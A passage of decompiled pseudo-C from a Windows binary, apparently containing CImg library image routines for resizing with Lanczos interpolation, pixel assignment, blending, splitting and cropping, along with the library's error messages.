                      {
                        v597 = (double)*v591;
                      }
                      else
                      {
                        v597 = (double)v591[-v735];
                        if ( (unsigned int)v591 > v704 )
                        {
                          v598 = (double)v591[-2 * v735];
                          goto LABEL_871;
                        }
                      }
                      v598 = v597;
LABEL_871:
                      if ( v591 > v593 )
                      {
                        v599 = (double)*v591;
LABEL_875:
                        v600 = v599;
                        goto LABEL_876;
                      }
                      v599 = (double)v591[v735];
                      if ( v591 >= v593 )
                        goto LABEL_875;
                      v600 = (double)v591[2 * v735];
LABEL_876:
                      v601 = v752 * v598 + v693 * v597 + v692 * (double)*v591 + v694 * v599;
                      v602 = 0.0;
                      v603 = (v601 + v600 * v596) / (v692 + v693 + v694 + v596);
                      if ( v603 >= 0.0 )
                        v602 = fmin(255.0, v603);
                      v604 = (_DWORD *)Size;
                      *v594 = (int)v602;
                      v594 += v735;
                      v591 += *v604;
                      Size = (size_t)(v604 + 1);
                      v223 = ++HIDWORD(v753) < v742;
                      v595 = (double *)HIDWORD(v699);
                    }
                    while ( v223 );
                  }
                  v588 = v741;
                  v590 = HIDWORD(v702) + 1;
                  v12 = (int *)v703;
                  v589 = v708;
                  v586 = v705;
                  HIDWORD(v702) = v590;
                }
                while ( v590 < v741 );
                v587 = v743;
              }
              v708 = ++v589;
            }
            while ( v589 < v587 );
            v585 = v744;
          }
          v705 = ++v586;
        }
        while ( v586 < v585 );
      }
      sub_424010((void **)&v736);
LABEL_886:
      v605 = v12[2];
      if ( v733 == v605 )
      {
        sub_42BCD0((int)&v727, &v741, 1);
        goto LABEL_927;
      }
      if ( v605 == 1 )
      {
        v606 = sub_424050(v690, v735, v734, v733, v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 88;
LABEL_891:
        sub_423F60(v606, (int)&v727);
        LOBYTE(v756) = 83;
        sub_421DE0(v690);
        sub_424010((void **)&v741);
        goto LABEL_927;
      }
      if ( v605 > v733 )
      {
        v606 = sub_424050(v690, v735, v734, v733, v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 89;
        goto LABEL_891;
      }
      if ( a8 || v733 <= v605 )
      {
        v609 = _mm_cvtsi32_si128(v733);
        v610 = (double)v605;
        v608 = v733;
        goto LABEL_898;
      }
      if ( v733 > 1 )
      {
        v607 = (double)v605;
        v608 = v733 - 1;
        v609 = _mm_cvtsi32_si128(v733 - 1);
        v610 = v607 - 1.0;
LABEL_898:
        v699 = v610 / (_mm_cvtepi32_pd(v609).m128d_f64[0] + *(double *)&qword_4EA220[v608 >> 31]);
        goto LABEL_899;
      }
      v699 = 0.0;
LABEL_899:
      v611 = v735 * v734;
      sub_42A620((int)&v727, v735, v734, v733, v12[3]);
      v612 = 0.0;
      v613 = (double *)Block;
      Size = v710;
      HIDWORD(v753) = 0;
      if ( v729 > 0 )
      {
        v614 = 0;
        do
        {
          v615 = v614;
          v750 = v612 + v699;
          *v613 = v612 - (double)v614;
          v704 = (unsigned int)(v613 + 1);
          v752 = (double)sub_42A5B0(v12) - 1.0;
          v750 = *sub_42BBB0(&v752, &v750);
          v614 = (unsigned int)v750;
          v616 = Size;
          v612 = v750;
          *(_DWORD *)Size = v611 * ((unsigned int)v750 - v615);
          Size = v616 + 4;
          v223 = ++HIDWORD(v753) < v729;
          v613 = (double *)v704;
        }
        while ( v223 );
      }
      v617 = v730;
      v705 = 0;
      if ( v730 > 0 )
      {
        v618 = v728;
        v619 = v727;
        do
        {
          v620 = 0;
          v708 = 0;
          if ( v618 > 0 )
          {
            do
            {
              v621 = 0;
              HIDWORD(v702) = 0;
              if ( v619 > 0 )
              {
                do
                {
                  v622 = sub_422930(&v741, v621, v620, 0, v705);
                  v623 = v12[2];
                  v624 = (unsigned __int8 *)v622;
                  v704 = v622 + v611;
                  v625 = v622 + v611 * (v623 - 2);
                  Size = sub_422930(&v727, SHIDWORD(v702), v708, 0, v705);
                  HIDWORD(v753) = v710;
                  v626 = (double *)Block;
                  HIDWORD(v752) = 0;
                  if ( v729 > 0 )
                  {
                    do
                    {
                      v750 = *v626;
                      HIDWORD(v699) = v626 + 1;
                      v692 = COERCE_FLOAT(sub_42B180(v750 + 2.0));
                      v693 = COERCE_FLOAT(sub_42B180(v750 + 1.0));
                      v694 = COERCE_FLOAT(sub_42B180(v750));
                      v688 = COERCE_FLOAT(sub_42B180(v750 - 1.0));
                      v627 = COERCE_FLOAT(sub_42B180(v750 - 2.0));
                      if ( (unsigned int)v624 < v704 )
                      {
                        v628 = (double)*v624;
                      }
                      else
                      {
                        v628 = (double)v624[-v611];
                        if ( (unsigned int)v624 > v704 )
                        {
                          v629 = (double)v624[-2 * v611];
                          goto LABEL_912;
                        }
                      }
                      v629 = v628;
LABEL_912:
                      if ( (unsigned int)v624 > v625 )
                      {
                        v630 = (double)*v624;
LABEL_916:
                        v631 = v630;
                        goto LABEL_917;
                      }
                      v630 = (double)v624[v611];
                      if ( (unsigned int)v624 >= v625 )
                        goto LABEL_916;
                      v631 = (double)v624[2 * v611];
LABEL_917:
                      v632 = v628 * v693 + v629 * v692 + (double)*v624 * v694 + v630 * v688;
                      v633 = 0.0;
                      v634 = (v632 + v631 * v627) / (v694 + v693 + v688 + v627);
                      if ( v634 >= 0.0 )
                        v633 = fmin(255.0, v634);
                      v635 = Size;
                      *(_BYTE *)Size = (int)v633;
                      Size = v611 + v635;
                      v624 += *(_DWORD *)HIDWORD(v753);
                      HIDWORD(v753) += 4;
                      v223 = ++HIDWORD(v752) < v729;
                      v626 = (double *)HIDWORD(v699);
                    }
                    while ( v223 );
                  }
                  v619 = v727;
                  v621 = HIDWORD(v702) + 1;
                  v12 = (int *)v703;
                  v620 = v708;
                  HIDWORD(v702) = v621;
                }
                while ( v621 < v727 );
                v618 = v728;
              }
              v708 = ++v620;
            }
            while ( v620 < v618 );
            v617 = v730;
          }
          ++v705;
        }
        while ( v705 < v617 );
      }
      sub_424010((void **)&v741);
LABEL_927:
      v636 = v12[3];
      if ( v726 == v636 )
      {
        sub_42BCD0((int)&v720, &v727, 1);
        goto LABEL_968;
      }
      if ( v636 != 1 )
      {
        if ( v636 > v726 )
        {
          v637 = sub_424050(v690, v735, v734, v733, v726, 2, 0, 0, 0, 0, 0);
          LOBYTE(v756) = 91;
          goto LABEL_932;
        }
        if ( a8 || v726 <= v636 )
        {
          v640 = _mm_cvtsi32_si128(v726);
          v641 = (double)v636;
          v639 = v726;
        }
        else
        {
          if ( v726 <= 1 )
          {
            v699 = 0.0;
            goto LABEL_940;
          }
          v638 = (double)v636;
          v639 = v726 - 1;
          v640 = _mm_cvtsi32_si128(v726 - 1);
          v641 = v638 - 1.0;
        }
        v699 = v641 / (_mm_cvtepi32_pd(v640).m128d_f64[0] + *(double *)&qword_4EA220[v639 >> 31]);
LABEL_940:
        v642 = v735 * v734 * v733;
        sub_42A620((int)&v720, v735, v734, v733, v726);
        v643 = 0.0;
        v644 = (double *)Block;
        Size = v710;
        HIDWORD(v753) = 0;
        if ( v723 > 0 )
        {
          v645 = 0;
          do
          {
            v646 = v645;
            v750 = v643 + v699;
            *v644 = v643 - (double)v645;
            v704 = (unsigned int)(v644 + 1);
            v752 = (double)sub_41C280(v12) - 1.0;
            v750 = *sub_42BBB0(&v752, &v750);
            v645 = (unsigned int)v750;
            v647 = Size;
            v643 = v750;
            *(_DWORD *)Size = v642 * ((unsigned int)v750 - v646);
            Size = v647 + 4;
            v223 = ++HIDWORD(v753) < v723;
            v644 = (double *)v704;
          }
          while ( v223 );
        }
        v648 = v722;
        v705 = 0;
        if ( v722 > 0 )
        {
          v649 = v721;
          v650 = v720;
          do
          {
            v651 = 0;
            v708 = 0;
            if ( v649 > 0 )
            {
              do
              {
                v652 = 0;
                HIDWORD(v702) = 0;
                if ( v650 > 0 )
                {
                  do
                  {
                    v653 = sub_422930(&v727, v652, v651, v705, 0);
                    v654 = v12[3];
                    v655 = (unsigned __int8 *)v653;
                    v704 = v653 + v642;
                    v656 = v653 + v642 * (v654 - 2);
                    Size = sub_422930(&v720, SHIDWORD(v702), v708, v705, 0);
                    HIDWORD(v753) = v710;
                    v657 = (double *)Block;
                    HIDWORD(v752) = 0;
                    if ( v723 > 0 )
                    {
                      do
                      {
                        v750 = *v657;
                        HIDWORD(v699) = v657 + 1;
                        v692 = COERCE_FLOAT(sub_42B180(v750 + 2.0));
                        v693 = COERCE_FLOAT(sub_42B180(v750 + 1.0));
                        v694 = COERCE_FLOAT(sub_42B180(v750));
                        v688 = COERCE_FLOAT(sub_42B180(v750 - 1.0));
                        v658 = COERCE_FLOAT(sub_42B180(v750 - 2.0));
                        if ( (unsigned int)v655 < v704 )
                        {
                          v659 = (double)*v655;
                        }
                        else
                        {
                          v659 = (double)v655[-v642];
                          if ( (unsigned int)v655 > v704 )
                          {
                            v660 = (double)v655[-2 * v642];
                            goto LABEL_953;
                          }
                        }
                        v660 = v659;
LABEL_953:
                        if ( (unsigned int)v655 > v656 )
                        {
                          v661 = (double)*v655;
LABEL_957:
                          v662 = v661;
                          goto LABEL_958;
                        }
                        v661 = (double)v655[v642];
                        if ( (unsigned int)v655 >= v656 )
                          goto LABEL_957;
                        v662 = (double)v655[2 * v642];
LABEL_958:
                        v663 = v659 * v693 + v660 * v692 + (double)*v655 * v694 + v661 * v688;
                        v664 = 0.0;
                        v665 = (v663 + v662 * v658) / (v694 + v693 + v688 + v658);
                        if ( v665 >= 0.0 )
                          v664 = fmin(255.0, v665);
                        v666 = Size;
                        *(_BYTE *)Size = (int)v664;
                        Size = v642 + v666;
                        v655 += *(_DWORD *)HIDWORD(v753);
                        HIDWORD(v753) += 4;
                        v223 = ++HIDWORD(v752) < v723;
                        v657 = (double *)HIDWORD(v699);
                      }
                      while ( v223 );
                    }
                    v650 = v720;
                    v652 = HIDWORD(v702) + 1;
                    v12 = (int *)v703;
                    v651 = v708;
                    HIDWORD(v702) = v652;
                  }
                  while ( v652 < v720 );
                  v649 = v721;
                }
                v708 = ++v651;
              }
              while ( v651 < v649 );
              v648 = v722;
            }
            ++v705;
          }
          while ( v705 < v648 );
        }
        sub_424010((void **)&v727);
        goto LABEL_968;
      }
      v637 = sub_424050(v690, v735, v734, v733, v726, 1, 0, 0, 0, 0, 0);
      LOBYTE(v756) = 90;
LABEL_932:
      sub_423F60(v637, (int)&v720);
      LOBYTE(v756) = 83;
      sub_421DE0(v690);
      sub_424010((void **)&v727);
LABEL_968:
      if ( v724 )
      {
        if ( v731 )
        {
          if ( v745 )
          {
            if ( v740 )
            {
              v667 = sub_423F40(v12, &v746);
              LOBYTE(v756) = 92;
              v668 = 0x2000000;
            }
            else
            {
              v667 = sub_422960(v697, (int)&v736);
              v756 = 93;
              v668 = 0x4000000;
            }
            v701 = v668;
            v669 = sub_422960(v687, (int)v667);
            v756 = 94;
            v670 = v668 | 0x8000000;
          }
          else
          {
            v669 = sub_422960(v686, (int)&v741);
            v756 = 95;
            v670 = 0x10000000;
          }
          v701 = v670;
          v671 = sub_422960(v685, (int)v669);
          v756 = 96;
          v672 = v670 | 0x20000000;
        }
        else
        {
          v671 = sub_422960(v684, (int)&v727);
          v756 = 97;
          v672 = 0x40000000;
        }
        v701 = v672;
        v673 = sub_422960(v683, (int)v671);
        v674 = v672 | 0x80000000;
        v756 = 98;
        v701 = v674;
      }
      else
      {
        v673 = sub_422960(v690, (int)&v720);
        v756 = 99;
        v689[1] = 1;
        v674 = v700;
      }
      v328 = v691;
      sub_422960(v691, (int)v673);
      v675 = v674 | 1;
      if ( (v689[1] & 1) != 0 )
        sub_421DE0(v690);
      if ( v675 < 0 )
      {
        v675 &= ~0x80000000;
        sub_421DE0(v683);
      }
      if ( (v675 & 0x40000000) != 0 )
      {
        v675 &= ~0x40000000u;
        sub_421DE0(v684);
      }
      if ( (v675 & 0x20000000) != 0 )
      {
        v675 &= ~0x20000000u;
        sub_421DE0(v685);
      }
      if ( (v675 & 0x10000000) != 0 )
      {
        v675 &= ~0x10000000u;
        sub_421DE0(v686);
      }
      if ( (v675 & 0x8000000) != 0 )
      {
        v675 &= ~0x8000000u;
        sub_421DE0(v687);
      }
      if ( (v675 & 0x4000000) != 0 )
      {
        v675 &= ~0x4000000u;
        sub_421DE0(v697);
      }
      v542 = (v675 & 0x2000000) == 0;
LABEL_801:
      if ( !v542 )
        sub_421DE0((void **)&v746);
      sub_421DE0((void **)&v720);
      sub_421DE0((void **)&v727);
      sub_421DE0((void **)&v741);
      v330 = (void **)&v736;
LABEL_504:
      sub_421DE0(v330);
      sub_421DE0(v711);
      sub_421DE0(v709);
      sub_421DE0((void **)&v714);
      return v328;
    default:
      sub_41C6D0();
      sub_41C2D0(
        (int)v698,
        (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::resize(): Invalid specified interpolation %d (should be { -1="
             "raw | 0=none | 1=nearest | 2=average | 3=linear | 4=grid | 5=cubic | 6=lanczos }).",
        *v12);
      _CxxThrowException(v698, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
  }
}
// 4EA220: using guessed type __int64 qword_4EA220[];

//----- (0042A5B0) --------------------------------------------------------
int __thiscall sub_42A5B0(_DWORD *this)
{
  return this[2];
}

//----- (0042A5C0) --------------------------------------------------------
_DWORD *__thiscall sub_42A5C0(void *this, int a2, int a3, int a4, int a5, unsigned __int8 *a6)
{
  _DWORD *result; // eax
  _DWORD *v7; // esi
  int v8; // ecx
  int v9; // edx
  int v10; // eax

  result = (_DWORD *)sub_42A620((int)this, a2, a3, a4, a5);
  v7 = result;
  if ( result[5] )
  {
    v8 = *result;
    if ( *result )
    {
      v9 = result[1];
      if ( v9 )
      {
        if ( result[2] )
        {
          v10 = result[3];
          if ( v10 )
            memset((void *)v7[5], *a6, v8 * v9 * v7[2] * v10);
          return v7;
        }
      }
    }
  }
  return result;
}

//----- (0042A620) --------------------------------------------------------
int __thiscall sub_42A620(int this, int a2, int a3, int a4, int a5)
{
  int v6; // ecx
  int v7; // edx
  int v8; // edi
  bool v9; // zf
  void *v10; // eax
  int v11; // eax
  int v13; // [esp+0h] [ebp-58h] BYREF
  char v14[16]; // [esp+20h] [ebp-38h] BYREF
  int v15; // [esp+30h] [ebp-28h]
  int v16; // [esp+34h] [ebp-24h]
  int v17; // [esp+38h] [ebp-20h]
  int v18; // [esp+3Ch] [ebp-1Ch]
  void *v19; // [esp+40h] [ebp-18h]
  int v20; // [esp+44h] [ebp-14h]
  int *v21; // [esp+48h] [ebp-10h]
  int v22; // [esp+54h] [ebp-4h]

  v21 = &v13;
  v20 = this;
  v6 = a3;
  v7 = a4;
  v8 = a5 * a4 * a3 * a2;
  if ( v8 )
  {
    v18 = *(_DWORD *)(this + 12);
    v17 = *(_DWORD *)(this + 8);
    v16 = *(_DWORD *)(this + 4);
    v15 = *(_DWORD *)this;
    if ( v8 != *(_DWORD *)(this + 12) * *(_DWORD *)(this + 8) * *(_DWORD *)(this + 4) * v15 )
    {
      v9 = *(_BYTE *)(this + 16) == 0;
      v10 = *(void **)(this + 20);
      v19 = v10;
      if ( !v9 )
      {
        sub_41C6D0();
        sub_41C2D0(
          (int)v14,
          (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::assign(): Invalid assignment request of shared instance fro"
               "m specified image (%u,%u,%u,%u).",
          v15);
        _CxxThrowException(v14, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
      }
      j_j__free(v10);
      v22 = 0;
      v11 = unknown_libname_86(v8);
      v6 = a3;
      v7 = a4;
      *(_DWORD *)(this + 20) = v11;
    }
    *(_DWORD *)this = a2;
    *(_DWORD *)(this + 4) = v6;
    *(_DWORD *)(this + 8) = v7;
    *(_DWORD *)(this + 12) = a5;
  }
  else
  {
    if ( !*(_BYTE *)(this + 16) )
      j_j__free(*(void **)(this + 20));
    *(_DWORD *)(this + 12) = 0;
    *(_DWORD *)(this + 8) = 0;
    *(_DWORD *)(this + 4) = 0;
    *(_DWORD *)this = 0;
    *(_BYTE *)(this + 16) = 0;
    *(_DWORD *)(this + 20) = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042A7F0) --------------------------------------------------------
_DWORD *__thiscall sub_42A7F0(_DWORD *this, int a2, int a3)
{
  size_t v4; // edi
  void *v5; // eax
  _DWORD v7[13]; // [esp+0h] [ebp-34h] BYREF

  v7[9] = v7;
  v7[8] = this;
  v4 = *(_DWORD *)(a2 + 12) * *(_DWORD *)(a2 + 8) * *(_DWORD *)a2 * *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(a2 + 20) && v4 )
  {
    *this = *(_DWORD *)a2;
    this[1] = *(_DWORD *)(a2 + 4);
    this[2] = *(_DWORD *)(a2 + 8);
    this[3] = *(_DWORD *)(a2 + 12);
    *((_BYTE *)this + 16) = 0;
    v7[12] = 0;
    v5 = (void *)unknown_libname_86(v4);
    this[5] = v5;
    memmove(v5, *(const void **)(a2 + 20), v4);
  }
  else
  {
    this[3] = 0;
    this[2] = 0;
    this[1] = 0;
    *this = 0;
    *((_BYTE *)this + 16) = 0;
    this[5] = 0;
  }
  return this;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);

//----- (0042A950) --------------------------------------------------------
int __thiscall sub_42A950(signed int *this, size_t a2, int a3, int a4, int a5, int *a6, float a7)
{
  bool v8; // zf
  signed int v9; // ecx
  signed int v10; // edx
  int v11; // eax
  int v12; // eax
  int v13; // ecx
  unsigned int v14; // edi
  int v15; // esi
  int v17; // eax
  signed int v18; // edx
  __m128 v19; // xmm3
  size_t v20; // esi
  int v21; // edi
  int v22; // edi
  int v23; // esi
  size_t v24; // eax
  signed __int32 v25; // edi
  unsigned __int32 v26; // eax
  signed int v27; // edx
  int v28; // eax
  signed int v29; // edx
  int v30; // eax
  int v31; // edi
  int v32; // edx
  unsigned __int32 v33; // xmm0_4
  int *v34; // esi
  int v35; // xmm2_4
  int v36; // ecx
  int v37; // eax
  int v38; // edi
  unsigned __int8 *v39; // ecx
  unsigned __int8 *v40; // edx
  size_t v41; // esi
  int v42; // eax
  float v43; // xmm1_4
  _DWORD v44[4]; // [esp+14h] [ebp-64h] BYREF
  char v45; // [esp+24h] [ebp-54h]
  void *Block; // [esp+28h] [ebp-50h]
  int v47; // [esp+2Ch] [ebp-4Ch]
  size_t v48; // [esp+30h] [ebp-48h]
  int v49; // [esp+34h] [ebp-44h]
  int v50; // [esp+38h] [ebp-40h]
  int v51; // [esp+3Ch] [ebp-3Ch]
  int v52; // [esp+40h] [ebp-38h]
  int *v53; // [esp+44h] [ebp-34h]
  int v54; // [esp+48h] [ebp-30h]
  int v55; // [esp+4Ch] [ebp-2Ch]
  int v56; // [esp+50h] [ebp-28h]
  int v57; // [esp+54h] [ebp-24h]
  int v58; // [esp+58h] [ebp-20h]
  int v59; // [esp+5Ch] [ebp-1Ch]
  unsigned __int32 v60; // [esp+60h] [ebp-18h]
  int v61; // [esp+64h] [ebp-14h]
  size_t Size; // [esp+68h] [ebp-10h]
  int v63; // [esp+74h] [ebp-4h]

  v8 = this[5] == 0;
  v59 = a5;
  Size = a2;
  v60 = a3;
  v61 = a4;
  v53 = a6;
  if ( v8 )
    return (int)this;
  v9 = *this;
  if ( !*this )
    return (int)this;
  v10 = this[1];
  if ( !v10 || !this[2] || !this[3] || !a6[5] )
    return (int)this;
  v11 = this[2] * this[3];
  v54 = a6[3];
  v12 = v9 * v10 * v11;
  v57 = a6[2];
  v58 = a6[1];
  v13 = *a6;
  v14 = this[5];
  if ( v14 + v12 <= a6[5] || v14 >= v54 * v57 * v58 * *a6 + a6[5] )
  {
    v17 = v60;
    v18 = *this;
    if ( Size || v60 || v61 || v59 != v60 || v18 != v13 || this[1] != v58 )
    {
      v19 = (__m128)LODWORD(a7);
    }
    else
    {
      v19 = (__m128)LODWORD(a7);
      if ( this[2] == v57 )
      {
        v17 = v60;
        if ( this[3] == v54 && a7 >= 1.0 && !*((_BYTE *)this + 16) )
          return sub_42BCD0((int)this, v53, 0);
      }
    }
    v20 = Size;
    v55 = 0;
    if ( (Size & 0x80000000) != 0 )
      v20 = 0;
    v21 = v17;
    v48 = v20;
    if ( v17 < 0 )
      v21 = v55;
    v52 = v21;
    v22 = v61;
    v55 = 0;
    if ( v61 < 0 )
      v22 = v55;
    v55 = v20 - Size;
    v49 = v22;
    v50 = v52 - v17;
    v23 = 0;
    v51 = v22 - v61;
    if ( v59 < 0 )
      v23 = -v59;
    v56 = v23;
    if ( (int)(v13 + Size) <= v18 )
      v24 = 0;
    else
      v24 = Size + v13 - v18;
    v25 = this[1];
    Size = v13 - v24 - v55;
    if ( (int)(v58 + v60) <= v25 )
      v26 = 0;
    else
      v26 = v60 + v58 - v25;
    v27 = this[2];
    v58 = v58 - v26 - v50;
    if ( v57 + v61 <= v27 )
      v28 = 0;
    else
      v28 = v61 + v57 - v27;
    v29 = this[3];
    v57 = v57 - v28 - v51;
    if ( v54 + v59 <= v29 )
      v30 = 0;
    else
      v30 = v59 + v54 - v29;
    v31 = v54 - v30 - v56;
    v54 = v31;
    v33 = sub_41C8A0(v19).m128_u32[0];
    v34 = v53;
    v60 = v33;
    *(float *)&v35 = 1.0 - fmaxf(0.0, v19.m128_f32[0]);
    v47 = v35;
    if ( v36 > 0 && v58 > 0 && v57 > 0 && v31 > 0 )
    {
      do
      {
        v37 = 0;
        v61 = 0;
        do
        {
          v38 = 0;
          do
          {
            v39 = (unsigned __int8 *)(this[5] + v48
                                              + *this * (v52 + v38 + this[1] * (v49 + v37 + this[2] * (v32 + v59))));
            v40 = (unsigned __int8 *)(v55 + v34[5] + *v34 * (v50 + v38 + v34[1] * (v51 + v37 + v56 * v34[2])));
            if ( v19.m128_f32[0] < 1.0 )
            {
              v41 = Size;
              do
              {
                v42 = *v40++;
                v43 = (float)((float)v42 * *(float *)&v33) + (float)((float)*v39 * *(float *)&v35);
                v33 = v60;
                *v39++ = (int)v43;
                --v41;
              }
              while ( v41 );
              v34 = v53;
            }
            else
            {
              memmove(v39, v40, Size);
              v35 = v47;
              v19.m128_f32[0] = a7;
            }
            v33 = v60;
            ++v38;
            v37 = v61;
            v32 = v56;
          }
          while ( v38 < v58 );
          v37 = v61 + 1;
          v61 = v37;
        }
        while ( v37 < v57 );
        v32 = v56 + 1;
        v8 = v54-- == 1;
        ++v56;
      }
      while ( !v8 );
    }
    return (int)this;
  }
  sub_42A7F0(v44, (int)a6, *a6);
  v63 = 0;
  v15 = sub_42A950(Size, v60, v61, v59, v44, LODWORD(a7));
  if ( !v45 )
    j_j__free(Block);
  return v15;
}
// 42ABEA: variable 'v36' is possibly undefined
// 42AC1A: variable 'v32' is possibly undefined
// 42A950: using guessed type _DWORD var_64[4];

//----- (0042AD00) --------------------------------------------------------
unsigned int *__thiscall sub_42AD00(int *this, unsigned int *a2, int a3, int a4)
{
  unsigned int *v4; // esi
  unsigned int v5; // ebx
  int v6; // edx
  int v7; // edi
  int v8; // eax
  int v9; // esi
  _DWORD *v10; // ebx
  int v11; // edi
  int *v12; // eax
  signed int v13; // ebx
  int v14; // edi
  char *v15; // edi
  signed int v16; // ebx
  int v17; // edi
  int v19; // edx
  int v20; // [esp+10h] [ebp-44h] BYREF
  char pExceptionObject[12]; // [esp+18h] [ebp-3Ch] BYREF
  void *Block; // [esp+24h] [ebp-30h]
  unsigned int *v23; // [esp+28h] [ebp-2Ch]
  int *v24; // [esp+2Ch] [ebp-28h]
  int v25; // [esp+30h] [ebp-24h]
  unsigned int *v26; // [esp+34h] [ebp-20h]
  int v27[2]; // [esp+38h] [ebp-1Ch] BYREF
  void *v28; // [esp+40h] [ebp-14h]
  int v29; // [esp+50h] [ebp-4h]

  v24 = this;
  v4 = a2;
  v5 = 0;
  v23 = a2;
  v26 = a2;
  v27[0] = 0;
  v27[1] = 0;
  v28 = 0;
  v29 = 0;
  if ( this[5] && (v6 = *this, (v26 = (unsigned int *)v6) != 0) && this[1] && this[2] && this[3] )
  {
    if ( (unsigned int)v6 < 0x100 )
    {
      sub_41C6D0();
      sub_41C2D0(
        (int)pExceptionObject,
        (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::get_split(): Instance cannot be split along %c-axis into %u blocs.",
        v19);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgArgumentException_cimg_library__);
    }
    v7 = 0;
    v8 = v6;
    if ( v6 > 0 )
    {
      v9 = 0;
      do
      {
        v8 -= 256;
        v25 = v8;
        if ( v8 <= 0 )
        {
          v10 = sub_42AF90(this, &v20, v7, 0, 0, 0, v9, this[1] - 1, this[2] - 1, this[3] - 1, (int)this);
          LOBYTE(v29) = 10;
          v11 = -1;
          if ( v27[0] != -1 )
            v11 = v27[0];
          v12 = sub_42C700(v27, 1u, v11);
          sub_423F60((int)v10, v12[2] + 24 * v11);
          LOBYTE(v29) = 0;
          if ( !pExceptionObject[8] )
            j_j__free(Block);
          v7 = v9 + 1;
          v8 = (int)v26 + v25;
          this = v24;
        }
        ++v9;
      }
      while ( v9 < *this );
      v5 = v27[0];
      v4 = v23;
    }
    *v4 = 0;
    v4[1] = 0;
    v4[2] = 0;
    sub_42B390(v4, v5);
    v13 = 0;
    if ( (int)*v4 > 0 )
    {
      v14 = 0;
      do
      {
        sub_42BCD0(v14 + v4[2], (int *)((char *)v28 + v14), *((_BYTE *)v28 + v14 + 16));
        ++v13;
        v14 += 24;
      }
      while ( v13 < (int)*v4 );
    }
    v29 = -1;
    if ( v28 )
    {
      v15 = (char *)v28 - 4;
      v29 = 24;
      `eh vector destructor iterator'(v28, 0x18u, *((_DWORD *)v28 - 1), (void (__thiscall *)(void *))sub_421DE0);
LABEL_27:
      sub_447DEF(v15);
    }
  }
  else
  {
    *a2 = 0;
    a2[1] = 0;
    a2[2] = 0;
    sub_42B390(a2, 0);
    v16 = 0;
    if ( (int)*a2 > 0 )
    {
      v17 = 0;
      do
      {
        sub_42BCD0(v17 + a2[2], (int *)((char *)v28 + v17), *((_BYTE *)v28 + v17 + 16));
        ++v16;
        v17 += 24;
      }
      while ( v16 < (int)*a2 );
    }
    v29 = -1;
    if ( v28 )
    {
      v15 = (char *)v28 - 4;
      v29 = 1;
      `eh vector destructor iterator'(v28, 0x18u, *((_DWORD *)v28 - 1), (void (__thiscall *)(void *))sub_421DE0);
      goto LABEL_27;
    }
  }
  return v4;
}
// 42AF6D: variable 'v19' is possibly undefined

//----- (0042AF90) --------------------------------------------------------
_DWORD *__thiscall sub_42AF90(
        int *this,
        _DWORD *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11)
{
  int v12; // edx
  int v13; // edx
  int v14; // edx
  int v15; // ebx
  void *v16; // ecx
  int v17; // eax
  char pExceptionObject[16]; // [esp+14h] [ebp-40h] BYREF
  void *v20; // [esp+24h] [ebp-30h]
  int v21; // [esp+28h] [ebp-2Ch]
  int v22; // [esp+2Ch] [ebp-28h]
  int v23; // [esp+30h] [ebp-24h]
  int v24; // [esp+34h] [ebp-20h]
  int v25; // [esp+38h] [ebp-1Ch]
  int v26; // [esp+3Ch] [ebp-18h]
  int v27; // [esp+40h] [ebp-14h]
  int v28; // [esp+44h] [ebp-10h]
  int v29; // [esp+50h] [ebp-4h]

  v29 = 0;
  v20 = a2;
  v21 = 0;
  if ( !this[5] || !*this || !this[1] || !this[2] || !this[3] )
  {
    sub_41C6D0();
    sub_41C430(
      (int)pExceptionObject,
      (int)"[instance(%u,%u,%u,%u,%p,%sshared)] CImg<%s>::crop(): Empty instance.",
      *this);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AUCImgInstanceException_cimg_library__);
  }
  v12 = a7;
  if ( a3 < a7 )
    v12 = a3;
  v26 = v12;
  v25 = a7 ^ a3 ^ v12;
  v13 = a8;
  if ( a4 < a8 )
    v13 = a4;
  v27 = v13;
  v24 = a8 ^ a4 ^ v13;
  v14 = a9;
  if ( a5 < a9 )
    v14 = a5;
  v22 = v14;
  v23 = a9 ^ a5 ^ v14;
  v15 = a10;
  if ( a6 < a10 )
    v15 = a6;
  v28 = a10 ^ a6 ^ v15;
  sub_421F20(a2, v25 - v26 + 1, v24 - v27 + 1, v23 - v14 + 1, v28 - v15 + 1);
  v29 = 0;
  v21 = 1;
  if ( v26 < 0 || v25 >= *this || v27 < 0 || v24 >= this[1] || v22 < 0 || v23 >= this[2] || v15 < 0 || v28 >= this[3] )
  {
    v16 = (void *)a2[5];
    if ( v16 )
    {
      if ( *a2 )
      {
        if ( a2[1] )
        {
          if ( a2[2] )
          {
            v17 = a2[3];
            if ( v17 )
              memset(v16, 0, *a2 * a2[1] * a2[2] * v17);
          }
        }
      }
    }
  }
  sub_42A950(a2, -v26, -v27, -v22, -v15, this, 1.0);
  return a2;
}

//----- (0042B180) --------------------------------------------------------
__int64 __usercall sub_42B180@<xmm0>(float a1@<xmm0>)
{
  unsigned int v1; // xmm0_4
  __int64 v2; // xmm1_8
  float v3; // xmm0_4
  float v5; // [esp+0h] [ebp-Ch]
  float v6; // [esp+4h] [ebp-8h]
  float v7; // [esp+8h] [ebp-4h]

  if ( a1 <= -2.0 || a1 >= 2.0 )
    return 0i64;
  v7 = a1 * 3.1415927;
  v5 = (float)(a1 * 3.1415927) * 0.5;
  if ( a1 == 0.0 )
    return 1065353216i64;
  *(float *)&v1 = *(double *)_libm_sse2_sin_precise().m128_u64;
  v6 = *(float *)&v1;
  v2 = v1;
  v3 = *(double *)_libm_sse2_sin_precise().m128_u64;
  *(float *)&v2 = (float)(v6 * v3) / (float)(v5 * v7);
  return v2;
}
// 4811B0: using guessed type __m128 _libm_sse2_sin_precise(void);

//----- (0042B230) --------------------------------------------------------
